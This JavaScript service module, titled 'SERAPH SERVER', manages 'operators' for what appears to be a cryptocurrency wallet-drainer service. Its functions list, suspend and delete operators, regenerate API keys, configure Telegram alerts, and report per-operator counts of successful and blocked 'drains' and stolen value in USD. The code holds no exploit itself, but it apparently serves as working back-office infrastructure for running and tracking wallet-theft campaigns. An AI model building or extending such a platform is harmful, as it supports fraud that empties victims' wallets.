/**
 * ============================================================================
 * SERAPH SERVER - Operator Service (V7 Updated)
 * ============================================================================
 */

import crypto from 'crypto'
import supabase from '../config/supabase.js'

/**
 * Get all operators (admin)
 */
export async function getAllOperators({ page = 1, limit = 20, status, search, sortBy = 'created_at', sortOrder = 'desc' }) {
  // Get operators with campaign count via join
  let query = supabase
    .from('operators')
    .select(`
      id, email, username, status, api_key,
      telegram_chat_id, notification_email,
      telegram_notifications, email_notifications,
      total_campaigns, total_drains, successful_drains, blocked_drains, total_value_usd,
      created_at, last_login, last_activity,
      campaigns:campaigns(count)
    `, { count: 'exact' })
  
  // Filters
  if (status) {
    query = query.eq('status', status)
  }
  
  if (search) {
    query = query.or(`email.ilike.%${search}%,username.ilike.%${search}%`)
  }
  
  // Sorting
  query = query.order(sortBy, { ascending: sortOrder === 'asc' })
  
  // Pagination
  const from = (page - 1) * limit
  const to = from + limit - 1
  query = query.range(from, to)
  
  const { data, error, count } = await query
  
  if (error) {
    throw new Error(error.message)
  }
  
  // Map field names to match frontend expectations
  // Use actual campaign count from join (dynamic), fallback to cached total_campaigns
  const operators = data.map(op => {
    const campaignCount = op.campaigns?.[0]?.count ?? op.total_campaigns ?? 0
    return {
      ...op,
      campaigns_count: campaignCount,
      total_value: op.total_value_usd,
      campaigns: undefined // Remove the raw join data from response
    }
  })
  
  return {
    operators,
    total: count,
    page,
    limit
  }
}

/**
 * Get operator by ID (admin)
 */
export async function getOperatorById(operatorId) {
  const { data, error } = await supabase
    .from('operators')
    .select(`
      id, email, username, status, api_key,
      telegram_chat_id, notification_email,
      telegram_notifications, email_notifications,
      total_campaigns, total_drains, successful_drains, blocked_drains, total_value_usd,
      created_at, updated_at, last_login, last_activity
    `)
    .eq('id', operatorId)
    .single()
  
  if (error) {
    throw new Error('Operator not found')
  }
  
  // Get their campaigns count
  const { count: campaignCount } = await supabase
    .from('campaigns')
    .select('id', { count: 'exact', head: true })
    .eq('operator_id', operatorId)
  
  // Get their wallets count
  const { count: walletCount } = await supabase
    .from('wallets')
    .select('id', { count: 'exact', head: true })
    .eq('operator_id', operatorId)
  
  return {
    ...data,
    campaigns_count: data.total_campaigns,
    total_value: data.total_value_usd,
    campaignCount,
    walletCount
  }
}

/**
 * Update operator settings (admin)
 * Updates notification preferences
 */
export async function updateOperator(operatorId, updates, adminId) {
  // Only allow specific fields to be updated
  const allowedFields = [
    'telegram_chat_id',
    'notification_email',
    'telegram_notifications',
    'email_notifications'
  ]
  
  const filteredUpdates = {}
  for (const field of allowedFields) {
    if (updates[field] !== undefined) {
      filteredUpdates[field] = updates[field]
    }
  }
  
  // Validate telegram chat ID if provided
  if (filteredUpdates.telegram_chat_id) {
    const chatId = filteredUpdates.telegram_chat_id.trim()
    if (chatId && !/^-?\d+$/.test(chatId)) {
      throw new Error('Invalid Telegram chat ID format')
    }
    filteredUpdates.telegram_chat_id = chatId || null
  }
  
  // Add updated timestamp
  filteredUpdates.updated_at = new Date().toISOString()
  
  const { data, error } = await supabase
    .from('operators')
    .update(filteredUpdates)
    .eq('id', operatorId)
    .select(`
      id, email, username, status,
      telegram_chat_id, notification_email,
      telegram_notifications, email_notifications
    `)
    .single()
  
  if (error) {
    throw new Error(error.message)
  }
  
  // Log activity
  await supabase
    .from('activity_logs')
    .insert({
      user_id: adminId,
      user_type: 'admin',
      action: 'operator.updated',
      entity_type: 'operator',
      entity_id: operatorId,
      details: { 
        updatedFields: Object.keys(filteredUpdates).filter(k => k !== 'updated_at')
      }
    })
  
  return data
}

/**
 * Update operator status (admin)
 */
export async function updateOperatorStatus(operatorId, status, adminId) {
  const validStatuses = ['active', 'suspended', 'banned']
  if (!validStatuses.includes(status)) {
    throw new Error('Invalid status')
  }
  
  const { data, error } = await supabase
    .from('operators')
    .update({
      status,
      updated_at: new Date().toISOString()
    })
    .eq('id', operatorId)
    .select('id, email, username, status')
    .single()
  
  if (error) {
    throw new Error(error.message)
  }
  
  // Log activity
  await supabase
    .from('activity_logs')
    .insert({
      user_id: adminId,
      user_type: 'admin',
      action: `operator.${status}`,
      entity_type: 'operator',
      entity_id: operatorId,
      details: { newStatus: status }
    })
  
  return data
}

/**
 * Delete operator (admin)
 */
export async function deleteOperator(operatorId, adminId) {
  // Get operator info first
  const { data: operator } = await supabase
    .from('operators')
    .select('email, username')
    .eq('id', operatorId)
    .single()
  
  if (!operator) {
    throw new Error('Operator not found')
  }
  
  // Delete (cascade will handle wallets, campaigns)
  const { error } = await supabase
    .from('operators')
    .delete()
    .eq('id', operatorId)
  
  if (error) {
    throw new Error(error.message)
  }
  
  // Log activity
  await supabase
    .from('activity_logs')
    .insert({
      user_id: adminId,
      user_type: 'admin',
      action: 'operator.deleted',
      entity_type: 'operator',
      entity_id: operatorId,
      details: { email: operator.email, username: operator.username }
    })
  
  return true
}

/**
 * Regenerate operator API key (admin or self)
 */
export async function regenerateApiKey(operatorId) {
  const newApiKey = crypto.randomBytes(32).toString('hex')
  
  const { data, error } = await supabase
    .from('operators')
    .update({
      api_key: newApiKey,
      updated_at: new Date().toISOString()
    })
    .eq('id', operatorId)
    .select('id, api_key')
    .single()
  
  if (error) {
    throw new Error(error.message)
  }
  
  return data
}

/**
 * Get operator stats (for dashboard)
 */
export async function getOperatorStats(operatorId) {
  const { data, error } = await supabase
    .from('operators')
    .select('total_campaigns, total_drains, successful_drains, blocked_drains, total_value_usd')
    .eq('id', operatorId)
    .single()
  
  if (error) {
    throw new Error(error.message)
  }
  
  // Get recent drains (last 7 days)
  const weekAgo = new Date(Date.now() - 7 * 24 * 60 * 60 * 1000).toISOString()
  
  const { data: recentDrains } = await supabase
    .from('drain_logs')
    .select('id, status, total_value_usd, created_at')
    .eq('operator_id', operatorId)
    .gte('created_at', weekAgo)
    .order('created_at', { ascending: false })
  
  return {
    ...data,
    recentDrains: recentDrains || [],
    successRate: data.total_drains > 0
      ? ((data.successful_drains / data.total_drains) * 100).toFixed(2)
      : 0
  }
}

/**
 * Update operator's own settings (self-service)
 * Operators can only update their notification preferences, not status/role
 */
export async function updateOwnSettings(operatorId, updates) {
  // Only allow specific fields for self-service
  const allowedFields = [
    'telegram_chat_id',
    'notification_email',
    'telegram_notifications',
    'email_notifications'
  ]
  
  const filteredUpdates = {}
  for (const field of allowedFields) {
    if (updates[field] !== undefined) {
      filteredUpdates[field] = updates[field]
    }
  }
  
  // Validate telegram chat ID if provided
  if (filteredUpdates.telegram_chat_id !== undefined) {
    const chatId = filteredUpdates.telegram_chat_id?.trim() || null
    if (chatId && !/^-?\d+$/.test(chatId)) {
      throw new Error('Invalid Telegram chat ID format')
    }
    filteredUpdates.telegram_chat_id = chatId
  }
  
  // Validate notification email if provided
  if (filteredUpdates.notification_email !== undefined) {
    const email = filteredUpdates.notification_email?.trim() || null
    if (email) {
      const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/
      if (!emailRegex.test(email)) {
        throw new Error('Invalid email format')
      }
    }
    filteredUpdates.notification_email = email
  }
  
  // Ensure boolean fields are actually booleans
  if (filteredUpdates.telegram_notifications !== undefined) {
    filteredUpdates.telegram_notifications = Boolean(filteredUpdates.telegram_notifications)
  }
  if (filteredUpdates.email_notifications !== undefined) {
    filteredUpdates.email_notifications = Boolean(filteredUpdates.email_notifications)
  }
  
  // Add updated timestamp
  filteredUpdates.updated_at = new Date().toISOString()
  
  const { data, error } = await supabase
    .from('operators')
    .update(filteredUpdates)
    .eq('id', operatorId)
    .select(`
      id, email, username, status, api_key,
      telegram_chat_id, notification_email,
      telegram_notifications, email_notifications
    `)
    .single()
  
  if (error) {
    throw new Error(error.message)
  }
  
  // Log activity
  await supabase
    .from('activity_logs')
    .insert({
      user_id: operatorId,
      user_type: 'operator',
      action: 'settings.updated',
      entity_type: 'operator',
      entity_id: operatorId,
      details: { 
        updatedFields: Object.keys(filteredUpdates).filter(k => k !== 'updated_at')
      }
    })
  
  return data
}

export default {
  getAllOperators,
  getOperatorById,
  updateOperator,
  updateOperatorStatus,
  deleteOperator,
  regenerateApiKey,
  getOperatorStats,
  updateOwnSettings
}